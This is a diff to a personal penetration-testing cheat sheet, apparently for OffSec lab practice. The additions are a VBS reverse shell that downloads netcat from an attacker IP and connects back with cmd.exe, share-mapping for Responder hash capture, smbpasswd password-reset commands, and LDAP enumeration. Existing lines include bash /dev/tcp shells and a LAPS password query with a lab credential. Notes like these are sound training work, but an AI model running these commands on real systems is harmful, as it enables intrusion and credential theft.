@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [smbpasswd](#smbpasswd)
   - [awk](#awk)
   - [samrdump](#samrdump)
   - [tar](#tar)
@@ -157,6 +158,15 @@ hit ctrl+z to background our shell and get back on our local terminal, and input
 
 ## Reverse Shell
 ```bash
+# vbs reverse shell
+Set oShell = CreateObject("Wscript.Shell")
+oShell.run "cmd.exe /c curl 10.8.0.136/nc64.exe -o C:\Windows\Temp\nc64.exe"
+oShell.run "cmd.exe /c C:\Windows\Temp\nc64.exe 10.8.0.136 2222 -e cmd.exe"
+
+# vbs with responder
+MapNetworkShare "\\192.168.45.202\UwU", "A"
+MapNetworkShare "\\192.168.45.202\OwO", "Z"
+
 # bash reverse shell
 bash -i >& /dev/tcp/192.168.45.x/80 0>&1
 bash -c 'bash -i >& /dev/tcp/192.168.45.202/80 0>&1'
@@ -734,6 +744,15 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### smbpasswd
+```bash
+# If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.
+smbpasswd -r <target-ip> -U <username>
+impacket-smbpasswd <DOMAIN>/<username>:<password>@<target-ip> -newpass <new-password>
+
+
+```
+
 ### awk
 ```bash
 echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
@@ -1423,6 +1442,9 @@ ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offse
 
 # authenticated(LAPS found from SYSVOL)
 ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+# Grab usernames(but could be risky based on vulnlab baby)
+ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec' | awk -F: '{ print $2 }' |  awk '{ gsub(/ /,""); print }'
 ```
 
 
@@ -2360,6 +2382,8 @@ sudo umount ./target-NFS
 
 
 # SMB
+https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/
+
 ```bash
 ==================================================================================================
 
